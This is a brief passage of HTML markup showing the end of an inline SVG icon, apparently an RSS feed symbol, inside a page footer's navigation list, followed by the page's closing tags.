  <path class="st0" d="M176,154h-16c0-67.27-54.73-122-122-122V16C114.09,16,176,77.91,176,154z"/>
  <circle class="st0" cx="38" cy="154" r="18"/>
</svg>

    
  </a>
</li>
        
      </ul>
    </nav>
  </div>
</footer>
  </body>
</html>
